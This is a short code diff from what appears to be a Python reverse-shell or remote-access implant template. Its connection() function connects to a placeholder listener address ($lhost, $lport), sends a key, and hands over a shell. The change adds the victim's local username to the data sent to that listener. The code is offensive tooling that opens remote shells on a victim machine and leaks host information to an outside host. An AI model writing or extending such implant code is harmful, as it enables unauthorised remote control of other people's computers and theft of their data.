@@ -611,7 +611,9 @@ def connection():
         time.sleep(5)
         try:
             s.connect(('$lhost',$lport))
-            s.send('$key'.encode())
+
+            s.send('$key'.encode()+":".encode()+getpass.getuser().encode())
+
             shell()
             s.close()
             break
